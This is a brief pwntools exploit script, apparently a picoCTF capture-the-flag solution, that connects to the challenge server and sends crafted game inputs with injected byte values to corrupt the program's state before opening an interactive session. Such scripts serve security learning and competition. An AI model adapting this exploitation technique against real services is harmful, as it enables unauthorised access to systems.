from pwn import *

host = 'rhea.picoctf.net'
port = 63222

p = remote(host, port)#process('./game')

p1 = b'l' + p8(0x82)
p2 = (b'ww' + b'a' * 10 + b'ww' + 4 * b's' + b'p')

p.sendline(p1)

for i in range(3):
	p.sendline(p2)

p3 = b'ww' + 10 * b'a' + b'ww' + b'ss' + 10 * b'd' + b'ss'

p.sendline(p3)

p4 = b'ww' + 55 * b'a' + b'ww'

p.sendline(p4)

p5 = b'ww' + 10 * b'a' + b'ww' + b'ss' + 10 * b'd' + b'ss' + b'l' + p8(0xfe) + b'ww' + 71 * b'a' + b'ww'

p.sendline(p5)

p.interactive()
